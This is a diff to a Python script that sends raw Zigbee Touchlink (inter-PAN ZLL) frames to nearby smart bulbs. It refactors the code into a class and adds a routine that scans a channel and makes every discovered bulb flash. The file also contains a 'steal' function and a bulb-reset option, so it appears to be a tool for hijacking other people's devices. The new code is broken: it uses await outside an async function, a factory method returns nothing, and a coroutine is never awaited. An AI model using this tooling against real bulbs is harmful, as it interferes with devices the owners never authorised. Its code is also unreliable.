@@ -88,11 +88,16 @@ class ResponseHandler:
         asyncio.create_task(dev.mfglibSendPacket(frame))   
 
 class Touchlink:
+
     def __init__(self, device_path, baud_rate):
         self.device_path = device_path
-        self.baud_rate = baud_rate
-        self.dev, self.eui64 = await prepare_config(device_path, baud_rate)
+        self.baud_rate = baud_rate       
         self.pcap = pure_pcapy.Dumper("log.pcap", 128, DLT_IEEE802_15_4)
+    
+    async def create(device_path, baud_rate):
+        tl = Touchlink(device_path, baud_rate)
+
+        tl.dev, tl.eui64 = await prepare_config(device_path, baud_rate)
 
     async def scan_channel(self, channel):
 
@@ -123,21 +128,28 @@ class Touchlink:
         return handler.targets
         
 
-    async def identify_bulb(dev, eui64, target, transaction_id, channel):
+    async def identify_bulb(self, target, transaction_id, channel):
         print(f"Sending flashing identifier packet to {target}")
-        res = await dev.mfglibSetChannel(channel)
+        res = await self.dev.mfglibSetChannel(channel)
         util.check(res[0], "Unable to set channel")
 
         frame = interpanZll.IdentifyReq(
             seq = 2,
             srcPan = 0,
-            extSrc = eui64,
+            extSrc = self.eui64,
             transactionId = transaction_id,
             extDst = target,
             frameControl = 0xCC21,
         ).serialize()
-        dump_pcap(frame)
-        await dev.mfglibSendPacket(frame)
+        dump_pcap(self.pcap, frame)
+        await self.dev.mfglibSendPacket(frame)
+
+    async def blink_routine(self, channel=None):
+        targets = self.scan_channel(channel)
+        print(f"{targets}")
+        for t in targets:
+            await self.identify_bulb(t.ext_address, t.transaction_id, t.channel)
+            
 
 async def steal(device_path, baudrate, scan_channel, reset_prompt=False, clean_up=True, config=None):
     if config:
@@ -255,4 +267,6 @@ if __name__ == "__main__":
     parser.add_argument('--no-reset', action="store_true", help='Whether to offer to reset the bulb')
     args = parser.parse_args()
 
-    asyncio.get_event_loop().run_until_complete(steal(args.device, args.baudrate, args.channel, reset_prompt=not args.no_reset))
+    # asyncio.get_event_loop().run_until_complete(steal(args.device, args.baudrate, args.channel, reset_prompt=not args.no_reset))
+    tl = await Touchlink.create(args.device, args.baudrate)
+    await tl.blink_routine(args.channel)
